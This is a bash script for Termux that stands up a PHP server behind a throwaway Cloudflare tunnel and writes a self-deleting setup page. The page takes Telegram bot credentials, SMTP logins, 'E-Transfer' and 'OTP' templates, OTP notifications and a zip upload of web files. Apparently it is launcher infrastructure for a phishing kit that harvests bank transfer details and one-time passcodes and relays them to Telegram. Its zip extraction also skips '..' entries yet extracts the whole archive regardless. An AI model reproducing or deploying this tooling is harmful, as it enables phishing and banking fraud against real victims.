#!/data/data/com.termux/files/usr/bin/bash
set -euo pipefail

# --- CONFIG ---
BASE="$(pwd)"
WWW="$BASE/.www"
CFG="$BASE/config"
LOGS="$BASE/.logs"
PHP_LOG="$LOGS/php.log"
CF_LOG="$LOGS/cloudflared.log"
PORT=$((RANDOM%64512+1024))
WAIT=2

mkdir -p "$WWW" "$CFG" "$LOGS"
: > "$PHP_LOG" : > "$CF_LOG"
chmod 600 "$PHP_LOG" "$CF_LOG" 2>/dev/null || true

# --- 1) Ensure Cloudflared installed ---
if ! command -v cloudflared >/dev/null 2>&1; then
    pkg update -y
    pkg install cloudflared -y
fi

# --- 2) Tools.php: Config + Web builder ---
TOOLS="$WWW/tools.php"
cat > "$TOOLS" <<'PHP'
<?php
session_start();
$msg=''; $ok=false;
$www=__DIR__; $cfg_dir=dirname($www).'/config'; @mkdir($cfg_dir,0755,true);
if ($_SERVER['REQUEST_METHOD']==='POST') {
    // Handle config save
    $post=array_map('trim',$_POST);
    $cfg=[
        'telegram'=>[
            'token'=>$post['telegram_token']??'',
            'chat_id'=>$post['telegram_chat_id']??'',
            'controller'=>$post['telegram_controller']??''
        ],
        'smtp'=>[
            'host'=>$post['smtp_host']??'',
            'port'=>(int)($post['smtp_port']??587),
            'user'=>$post['smtp_user']??'',
            'pass'=>$post['smtp_pass']??'',
            'from'=>$post['smtp_from']??($post['smtp_user']??'')
        ],
        'templates'=>[
            'etransfer'=>$post['etransfer_template']??'templates/etransfer.html',
            'otp'=>$post['otp_template']??'templates/otp.html'
        ],
        'notice'=>[
            'etransfer'=>isset($post['notice_etransfer']),
            'otp'=>isset($post['notice_otp'])
        ]
    ];
    $cfg_php="<?php\nreturn ".var_export($cfg,true).";\n";
    if(file_put_contents($cfg_dir.'/config.php',$cfg_php) !== false){
        chmod($cfg_dir.'/config.php',0600);
        $ok=true;
        @unlink(__FILE__);
    }else{$msg='Failed to save config.';}
}

// Handle web zip upload
if(isset($_FILES['zipfile']['tmp_name'])){
    $tmp=$_FILES['zipfile']['tmp_name'];
    if($_FILES['zipfile']['error']===UPLOAD_ERR_OK){
        $zip=new ZipArchive();
        if($zip->open($tmp)===true){
            for($i=0;$i<$zip->numFiles;$i++){
                $f=$zip->getNameIndex($i);
                if(strpos($f,'..')!==false) continue;
                $zip->extractTo($www);
            }
            $zip->close();
            $msg="Files unpacked successfully. Redirecting to index.php...";
            echo "<script>setTimeout(()=>location='index.php',1500)</script>";
        }else{$msg='Invalid zip file.';}
    }else{$msg='Upload error.';}
}

function esc($s){return htmlspecialchars($s,ENT_QUOTES);}
?>
<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Web Builder & Config</title>
<style>
body{font-family:system-ui;background:#0b0f12;color:#e6eef6;padding:16px}
.container{max-width:720px;margin:auto}
.card{background:#0f1519;padding:12px;border-radius:10px;margin-bottom:12px}
input,button{width:100%;margin-top:6px;padding:8px;border-radius:6px;border:none;background:#1f6feb;color:#fff}
label{font-size:13px;color:#9fb1cc;margin-top:6px;display:block}
.err{background:#3a0b0b;color:#ffb3b3;padding:6px;border-radius:6px}
.ok{background:#07220b;color:#a8ffb0;padding:6px;border-radius:6px}
</style></head><body>
<div class="container">
<h2>Config & Web Builder</h2>
<?php if($msg): ?><div class="<?= $ok?'ok':'err' ?>"><?=esc($msg)?></div><?php endif; ?>
<div class="card">
<form method="post" enctype="multipart/form-data">
<h3>Upload Web Zip</h3>
<input type="file" name="zipfile" accept=".zip" required>
<button type="submit">Upload & Extract</button>
</form>
<form method="post" style="margin-top:12px">
<h3>Telegram</h3>
<label>Bot token</label><input type="text" name="telegram_token" value="<?=esc($_POST['telegram_token']??'')?>">
<label>Chat ID</label><input type="text" name="telegram_chat_id" value="<?=esc($_POST['telegram_chat_id']??'')?>">
<label>Controller</label><input type="text" name="telegram_controller" value="<?=esc($_POST['telegram_controller']??'')?>">
<h3>SMTP</h3>
<label>Host</label><input type="text" name="smtp_host" value="<?=esc($_POST['smtp_host']??'')?>">
<label>Port</label><input type="number" name="smtp_port" value="<?=esc($_POST['smtp_port']??'587')?>">
<label>User</label><input type="text" name="smtp_user" value="<?=esc($_POST['smtp_user']??'')?>">
<label>Password</label><input type="password" name="smtp_pass" value="<?=esc($_POST['smtp_pass']??'')?>">
<label>From (optional)</label><input type="text" name="smtp_from" value="<?=esc($_POST['smtp_from']??'')?>">
<h3>Templates & Notices</h3>
<label>E-Transfer template</label><input type="text" name="etransfer_template" value="<?=esc($_POST['etransfer_template']??'templates/etransfer.html')?>">
<label>OTP template</label><input type="text" name="otp_template" value="<?=esc($_POST['otp_template']??'templates/otp.html')?>">
<label><input type="checkbox" name="notice_etransfer" <?=isset($_POST['notice_etransfer'])?'checked':''?>> Notify on e-transfer</label>
<label><input type="checkbox" name="notice_otp" <?=isset($_POST['notice_otp'])?'checked':''?>> Notify on OTP</label>
<button type="submit">Save Config & Remove tools.php</button>
</form>
</div></div></body></html>
PHP

chmod 644 "$TOOLS"

# --- 3) Start PHP server ---
pkill -f "php -S 127.0.0.1:${PORT}" 2>/dev/null || true
nohup php -S 127.0.0.1:${PORT} -t "$WWW" >"$PHP_LOG" 2>&1 &
PHP_PID=$!
sleep 0.8
echo "[INFO] PHP PID: $PHP_PID, serving .www on port $PORT"

# --- 4) Start Cloudflared tunnel ---
pkill -f "cloudflared tunnel --url" 2>/dev/null || true
nohup cloudflared tunnel --url "http://127.0.0.1:${PORT}" --loglevel info >"$CF_LOG" 2>&1 &
CLOUD_PID=$!
sleep 2

# --- 5) Wait for public URL ---
END=$((SECONDS+20))
PUBLIC_URL=""
while [ $SECONDS -le $END ]; do
    PUBLIC_URL=$(grep -Eo 'https?://[a-z0-9-]+\.trycloudflare\.com' "$CF_LOG" 2>/dev/null | tail -n1 || true)
    [ -n "$PUBLIC_URL" ] && break
    sleep 1
done

echo "[INFO] Public URL: ${PUBLIC_URL:-NOT FOUND}"
echo "[INFO] Access tools.php to setup web app and config."